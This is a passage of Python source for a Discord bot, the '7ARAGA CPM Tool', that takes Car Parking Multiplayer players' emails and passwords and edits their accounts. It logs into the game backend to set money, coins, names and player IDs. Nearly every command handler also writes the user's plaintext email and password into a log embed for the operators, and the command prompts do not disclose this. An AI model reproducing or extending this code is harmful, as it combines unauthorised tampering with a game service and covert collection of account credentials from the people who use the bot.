        await interaction.response.send_message(f"❌ You have reached your limit ({limit_info['limit']} uses). Contact admin.", ephemeral=True)
        return
    
    if amount > MAX_MONEY:
        await interaction.response.send_message(f"❌ Max is ${MAX_MONEY:,}", ephemeral=True)
        return
    if amount < 0:
        await interaction.response.send_message("❌ Cannot set negative money", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # 🔥 الحصول على بيانات اللاعب
        login_result = await nuker.login(email, password)
        player_name = "Unknown"
        player_id = "Unknown"
        if login_result.get("ok"):
            auth = login_result["auth"]
            firebase_uid = login_result.get("firebase_uid", "")
            load_result = await nuker._load_with_auth(auth, firebase_uid, password, email)
            if load_result.get("ok") and load_result.get("record"):
                record = load_result.get("record", {})
                player_name = record.get("Name", "Unknown")
                player_id = record.get("localID", "Unknown")
        
        result = await nuker.set_money_with_email(email, password, amount, interaction.user.id)
        
        if result.get("ok"):
            increment_usage(interaction.user.id)
            await interaction.edit_original_response(content=f"✅ Money set to **${amount:,}** for **{email}**!")
            await send_log(
                title="💰 Money Set",
                description=f"└ Discord: {interaction.user.name}",
                color=0x00ff00,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("💵 Amount", f"`${amount:,}`", False)
                ]
            )
        else:
            await interaction.edit_original_response(content=f"❌ Failed: {result.get('message', 'Unknown error')}")
            await send_log(
                title="❌ Money Failed",
                description=f"└ Discord: {interaction.user.name}",
                color=0xff0000,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("💵 Amount", f"`${amount:,}`", False),
                    ("❌ Error", result.get('message', 'Unknown error'), False)
                ]
            )
    except Exception as e:
        await interaction.edit_original_response(content=f"❌ Error: {str(e)}")
        await send_log(
            title="⚠️ Money Error",
            description=f"└ Discord: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("📧 Email", f"`{email}`", False),
                ("❌ Error", str(e), False)
            ]
        )


# ── COINS ──
@bot.tree.command(name="coins", description="🪙 Set coins with email and password")
@app_commands.describe(
    email="Your CPM email",
    password="Your CPM password",
    amount="Amount of coins (max 500,000)"
)
async def slash_coins(interaction: discord.Interaction, email: str, password: str, amount: int):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("❌ No access.", ephemeral=True)
        return
    
    if is_banned(interaction.user.id):
        await interaction.response.send_message("🚫 You are banned!", ephemeral=True)
        return
    
    if not check_limit(interaction.user.id):
        limit_info = get_user_limit_info(interaction.user.id)
        await interaction.response.send_message(f"❌ You have reached your limit ({limit_info['limit']} uses). Contact admin.", ephemeral=True)
        return
    
    if amount > MAX_COIN:
        await interaction.response.send_message(f"❌ Max is {MAX_COIN:,} coins", ephemeral=True)
        return
    if amount < 0:
        await interaction.response.send_message("❌ Cannot set negative coins", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # 🔥 الحصول على بيانات اللاعب
        login_result = await nuker.login(email, password)
        player_name = "Unknown"
        player_id = "Unknown"
        if login_result.get("ok"):
            auth = login_result["auth"]
            firebase_uid = login_result.get("firebase_uid", "")
            load_result = await nuker._load_with_auth(auth, firebase_uid, password, email)
            if load_result.get("ok") and load_result.get("record"):
                record = load_result.get("record", {})
                player_name = record.get("Name", "Unknown")
                player_id = record.get("localID", "Unknown")
        
        result = await nuker.set_coin_with_email(email, password, amount, interaction.user.id)
        
        if result.get("ok"):
            increment_usage(interaction.user.id)
            await interaction.edit_original_response(content=f"✅ Coins set to **{amount:,}** for **{email}**!")
            await send_log(
                title="🪙 Coins Set",
                description=f"└ Discord: {interaction.user.name}",
                color=0x00ff00,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("🪙 Amount", f"`{amount:,}`", False)
                ]
            )
        else:
            await interaction.edit_original_response(content=f"❌ Failed: {result.get('message', 'Unknown error')}")
            await send_log(
                title="❌ Coins Failed",
                description=f"└ Discord: {interaction.user.name}",
                color=0xff0000,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("🪙 Amount", f"`{amount:,}`", False),
                    ("❌ Error", result.get('message', 'Unknown error'), False)
                ]
            )
    except Exception as e:
        await interaction.edit_original_response(content=f"❌ Error: {str(e)}")
        await send_log(
            title="⚠️ Coins Error",
            description=f"└ Discord: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("📧 Email", f"`{email}`", False),
                ("❌ Error", str(e), False)
            ]
        )


# ── CHANGE NAME ──
@bot.tree.command(name="name", description="👤 Change player name with email and password")
@app_commands.describe(
    email="Your CPM email",
    password="Your CPM password",
    new_name="New player name (2-30 characters)"
)
async def slash_name(interaction: discord.Interaction, email: str, password: str, new_name: str):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("❌ No access.", ephemeral=True)
        return
    
    if is_banned(interaction.user.id):
        await interaction.response.send_message("🚫 You are banned!", ephemeral=True)
        return
    
    if not check_limit(interaction.user.id):
        limit_info = get_user_limit_info(interaction.user.id)
        await interaction.response.send_message(f"❌ You have reached your limit ({limit_info['limit']} uses). Contact admin.", ephemeral=True)
        return
    
    if len(new_name) < 2 or len(new_name) > 30:
        await interaction.response.send_message("❌ Name must be 2-30 characters.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # 🔥 الحصول على بيانات اللاعب قبل التغيير
        login_result = await nuker.login(email, password)
        player_name = "Unknown"
        player_id = "Unknown"
        if login_result.get("ok"):
            auth = login_result["auth"]
            firebase_uid = login_result.get("firebase_uid", "")
            load_result = await nuker._load_with_auth(auth, firebase_uid, password, email)
            if load_result.get("ok") and load_result.get("record"):
                record = load_result.get("record", {})
                player_name = record.get("Name", "Unknown")
                player_id = record.get("localID", "Unknown")
        
        result = await nuker.set_name_with_email(email, password, new_name, interaction.user.id)
        
        if result.get("ok"):
            increment_usage(interaction.user.id)
            await interaction.edit_original_response(content=f"✅ Name changed to **{new_name}** for **{email}**!")
            await send_log(
                title="👤 Name Changed",
                description=f"└ Discord: {interaction.user.name}",
                color=0x00ff00,
                fields=[
                    ("🎮 Old Name", f"`{player_name}`", False),
                    ("✨ New Name", f"`{new_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False)
                ]
            )
        else:
            await interaction.edit_original_response(content=f"❌ Failed: {result.get('message', 'Unknown error')}")
            await send_log(
                title="❌ Name Change Failed",
                description=f"└ Discord: {interaction.user.name}",
                color=0xff0000,
                fields=[
                    ("🎮 Old Name", f"`{player_name}`", False),
                    ("✨ New Name", f"`{new_name}`", False),
                    ("   In-Game Id", f"`{player_id}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("❌ Error", result.get('message', 'Unknown error'), False)
                ]
            )
    except Exception as e:
        await interaction.edit_original_response(content=f"❌ Error: {str(e)}")
        await send_log(
            title="⚠️ Name Change Error",
            description=f"└ Discord: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("📧 Email", f"`{email}`", False),
                ("❌ Error", str(e), False)
            ]
        )


# ── CHANGE ID ──
@bot.tree.command(name="playerid", description="🆔 Change player ID with email and password")
@app_commands.describe(
    email="Your CPM email",
    password="Your CPM password",
    new_id="New player ID (4-20 characters)"
)
async def slash_playerid(interaction: discord.Interaction, email: str, password: str, new_id: str):
    if not is_allowed(interaction.user.id):
        await interaction.response.send_message("❌ No access.", ephemeral=True)
        return
    
    if is_banned(interaction.user.id):
        await interaction.response.send_message("🚫 You are banned!", ephemeral=True)
        return
    
    if not check_limit(interaction.user.id):
        limit_info = get_user_limit_info(interaction.user.id)
        await interaction.response.send_message(f"❌ You have reached your limit ({limit_info['limit']} uses). Contact admin.", ephemeral=True)
        return
    
    clean = re.sub(r'\[\w+\]', '', new_id)
    if len(clean) < 4 or len(clean) > 20:
        await interaction.response.send_message("❌ Player ID must be 4-20 characters.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # 🔥 الحصول على بيانات اللاعب قبل التغيير
        login_result = await nuker.login(email, password)
        player_name = "Unknown"
        player_id = "Unknown"
        if login_result.get("ok"):
            auth = login_result["auth"]
            firebase_uid = login_result.get("firebase_uid", "")
            load_result = await nuker._load_with_auth(auth, firebase_uid, password, email)
            if load_result.get("ok") and load_result.get("record"):
                record = load_result.get("record", {})
                player_name = record.get("Name", "Unknown")
                player_id = record.get("localID", "Unknown")
        
        result = await nuker.set_id_with_email(email, password, new_id, interaction.user.id)
        
        if result.get("ok"):
            increment_usage(interaction.user.id)
            await interaction.edit_original_response(content=f"✅ Player ID changed to **{new_id.upper()}** for **{email}**!")
            await send_log(
                title="🆔 ID Changed",
                description=f"└ Discord: {interaction.user.name}",
                color=0x00ff00,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("🆔 Old ID", f"`{player_id}`", False),
                    ("🆔 New ID", f"`{new_id.upper()}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False)
                ]
            )
        else:
            await interaction.edit_original_response(content=f"❌ Failed: {result.get('message', 'Unknown error')}")
            await send_log(
                title="❌ ID Change Failed",
                description=f"└ Discord: {interaction.user.name}",
                color=0xff0000,
                fields=[
                    ("🎮 In-Game Name", f"`{player_name}`", False),
                    ("🆔 Old ID", f"`{player_id}`", False),
                    ("🆔 New ID", f"`{new_id.upper()}`", False),
                    ("📧 Email", f"`{email}`", False),
                    ("🔑 Password", f"`{password}`", False),
                    ("❌ Error", result.get('message', 'Unknown error'), False)
                ]
            )
    except Exception as e:
        await interaction.edit_original_response(content=f"❌ Error: {str(e)}")
        await send_log(
            title="⚠️ ID Change Error",
            description=f"└ Discord: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("📧 Email", f"`{email}`", False),
                ("❌ Error", str(e), False)
            ]
        )


# ═══════════════════════════════════════════
#  📌 ADMIN COMMANDS
# ═══════════════════════════════════════════

# ── SET LIMIT ──
@bot.tree.command(name="setlimit", description="🛡️ Set user limit")
@app_commands.describe(
    user="Mention the user",
    limit="Limit value"
)
async def slash_setlimit(interaction: discord.Interaction, user: discord.Member, limit: int):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    if limit < 1:
        await interaction.response.send_message("❌ Limit must be at least 1!", ephemeral=True)
        return
    
    set_user_limit(user.id, limit)
    await interaction.response.send_message(f"✅ Limit set to **{limit}** for **{user.mention}**!")
    await send_log(
        title="🛡️ Limit Set",
        description=f"└ Admin: {interaction.user.name}",
        color=0xffff00,
        fields=[
            ("👤 User", user.mention, False),
            ("🔢 New Limit", str(limit), False)
        ]
    )

# ── RESET LIMIT ──
@bot.tree.command(name="resetlimit", description="🛡️ Reset user limit")
@app_commands.describe(
    user="Mention the user"
)
async def slash_resetlimit(interaction: discord.Interaction, user: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    reset_user_limit(user.id)
    await interaction.response.send_message(f"✅ Limit reset for **{user.mention}**!")
    await send_log(
        title="🛡️ Limit Reset",
        description=f"└ Admin: {interaction.user.name}",
        color=0xffff00,
        fields=[
            ("👤 User", user.mention, False)
        ]
    )

# ── BAN ──
@bot.tree.command(name="ban", description="🛡️ Ban a user")
@app_commands.describe(
    user="Mention the user to ban"
)
async def slash_ban(interaction: discord.Interaction, user: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    if user.id == OWNER_ID:
        await interaction.response.send_message("❌ Cannot ban the owner!", ephemeral=True)
        return
    if user.id in ADMINS:
        await interaction.response.send_message("❌ Cannot ban an admin!", ephemeral=True)
        return
    
    if user.id not in BANNED:
        BANNED.append(user.id)
        STORE["banned"] = BANNED
        save_store(STORE)
        await interaction.response.send_message(f"🚫 **{user.mention}** has been banned!")
        await send_log(
            title="🚫 User Banned",
            description=f"└ Admin: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("👤 Banned User", user.mention, False)
            ]
        )
    else:
        await interaction.response.send_message(f"⚠️ **{user.mention}** is already banned!")

# ── UNBAN ──
@bot.tree.command(name="unban", description="🛡️ Unban a user")
@app_commands.describe(
    user="Mention the user to unban"
)
async def slash_unban(interaction: discord.Interaction, user: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    if user.id in BANNED:
        BANNED.remove(user.id)
        STORE["banned"] = BANNED
        save_store(STORE)
        await interaction.response.send_message(f"✅ **{user.mention}** has been unbanned!")
        await send_log(
            title="✅ User Unbanned",
            description=f"└ Admin: {interaction.user.name}",
            color=0x00ff00,
            fields=[
                ("👤 Unbanned User", user.mention, False)
            ]
        )
    else:
        await interaction.response.send_message(f"⚠️ **{user.mention}** is not banned!")

# ── ADD USER ──
@bot.tree.command(name="adduser", description="🛡️ Add a user")
@app_commands.describe(
    user="Mention the user to add"
)
async def slash_adduser(interaction: discord.Interaction, user: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    if user.id not in ALLOWED_USERS:
        ALLOWED_USERS.append(user.id)
        STORE["allowed_users"] = ALLOWED_USERS
        save_store(STORE)
        await interaction.response.send_message(f"✅ **{user.mention}** has been added!")
        await send_log(
            title="✅ User Added",
            description=f"└ Admin: {interaction.user.name}",
            color=0x00ff00,
            fields=[
                ("👤 Added User", user.mention, False)
            ]
        )
    else:
        await interaction.response.send_message(f"⚠️ **{user.mention}** is already added!")

# ── REMOVE USER ──
@bot.tree.command(name="removeuser", description="🛡️ Remove a user")
@app_commands.describe(
    user="Mention the user to remove"
)
async def slash_removeuser(interaction: discord.Interaction, user: discord.Member):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    if user.id == OWNER_ID:
        await interaction.response.send_message("❌ Cannot remove the owner!", ephemeral=True)
        return
    if user.id in ADMINS:
        await interaction.response.send_message("❌ Cannot remove an admin!", ephemeral=True)
        return
    
    if user.id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user.id)
        STORE["allowed_users"] = ALLOWED_USERS
        save_store(STORE)
        await interaction.response.send_message(f"✅ **{user.mention}** has been removed!")
        await send_log(
            title="❌ User Removed",
            description=f"└ Admin: {interaction.user.name}",
            color=0xff0000,
            fields=[
                ("👤 Removed User", user.mention, False)
            ]
        )
    else:
        await interaction.response.send_message(f"⚠️ **{user.mention}** is not in the list!")

# ── ADMIN LIST ──
@bot.tree.command(name="admin_list", description="📋 List all users with their limits")
async def slash_admin_list(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin permission required!", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="📋 Users List",
        color=discord.Color.blue()
    )
    
    if not USER_LIMITS and not ALLOWED_USERS:
        embed.add_field(name="No users", value="No users registered yet.", inline=False)
    else:
        allowed_text = ""
        for uid in ALLOWED_USERS[:20]:
            try:
                user = await bot.fetch_user(uid)
                name = user.name if user else str(uid)
                is_banned_status = "🚫" if uid in BANNED else "✅"
                is_admin_status = "🛡️" if uid in ADMINS else "👤"
                limit_info = get_user_limit_info(uid)
                allowed_text += f"{is_admin_status} {name} {is_banned_status} | Limit: {limit_info['limit']} | Used: {limit_info['used']}\n"
            except:
                pass
        
        if allowed_text:
            embed.add_field(name="👥 Users", value=allowed_text[:1024], inline=False)
        else:
            embed.add_field(name="👥 Users", value="No users found.", inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════
#  📌 HELP COMMAND
# ═══════════════════════════════════════════

@bot.tree.command(name="help", description="📖 Show all commands")
async def slash_help(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🚗 7ARAGA CPM Tool",
        description="CPM Car Parking Multiplayer Commands",
        color=discord.Color.gold()
    )
    embed.add_field(
        name="👑 King Rank",
        value="`/king email password` - Set King Rank",
        inline=False
    )
    embed.add_field(
        name="💰 Money",
        value="`/money email password amount` - Set money (max 50M)",
        inline=False
    )
    embed.add_field(
        name="🪙 Coins",
        value="`/coins email password amount` - Set coins (max 500K)",
        inline=False
    )
    embed.add_field(
        name="👤 Change Name",
        value="`/name email password new_name` - Change player name",
        inline=False
    )
    embed.add_field(
        name="🆔 Change ID",
        value="`/playerid email password new_id` - Change player ID",
        inline=False
    )
    embed.add_field(
        name="🛡️ Admin Commands",
        value="`/setlimit @user limit:` - Set user limit\n`/resetlimit @user` - Reset user limit\n`/ban @user` - Ban user\n`/unban @user` - Unban user\n`/adduser @user` - Add user\n`/removeuser @user` - Remove user\n`/admin_list` - List all users",
        inline=False
    )
    embed.set_footer(text="7ARAGA Tool ❤️")
    await interaction.response.send_message(embed=embed)


# ═══════════════════════════════════════════
#  🚀 MAIN
# ═══════════════════════════════════════════

if __name__ == "__main__":
    nuker = CPMNuker()
    bot.run(TOKEN)